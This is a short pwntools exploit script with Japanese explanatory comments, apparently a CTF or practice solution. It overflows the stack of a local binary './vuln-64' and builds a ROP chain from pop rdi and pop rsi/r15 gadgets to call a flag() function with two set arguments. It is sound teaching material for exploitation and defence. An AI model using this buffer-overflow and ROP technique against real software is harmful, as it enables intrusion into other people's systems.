from pwn import *

p = process('./vuln-64')

# pop rdi; ret の命令があるアドレスと、 pop rsi; pop r15; ret の命令があるアドレス
POP_RDI, POP_RSI_R15 = 0x4011fb, 0x4011f9

payload = b'A' * 56	        # リターンアドレスまでのパディング
payload += p64(POP_RDI)	    # pop rdi; ret 命令に飛ぶ
payload += p64(0xdeadc0de)	# 
payload += p64(POP_RSI_R15)	#
payload += p64(0xc0ded00d)	#
payload += p64(0x0)	        #
payload += p64(0x40116f)	# address of flag()
payload += p64(0x0)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())

# x86と違って引数をレジスタへ格納する必要があるため、ROPGadgetを使ってうまく引数をセットしつつ、戻りアドレスを書き換えて目的の関数へと飛ぶ

# リターンアドレスを pop rdi; ret 命令のある場所に書き換える
# pop rdi; ret に飛ぶ -> pop rdi 命令によって 0x4011fb(pop rdi; ret命令のアドレス)の下に配置されていた0xdeadc0deがrdiにセットされる
# 次にret 命令が実行されるが、これは pop rip のことなので、0xdeadc0de の次にある pop rsi; pop r15; ret に飛ぶ
# pop rsi 命令によって 0xc0ded00d が rsi にセットされ、 pop r15 命令によって r15 に 0x0 がセットされる
# 最後に ret 命令によって 0x40116f が rip にセットされ、flag()関数が引数を持って実行される
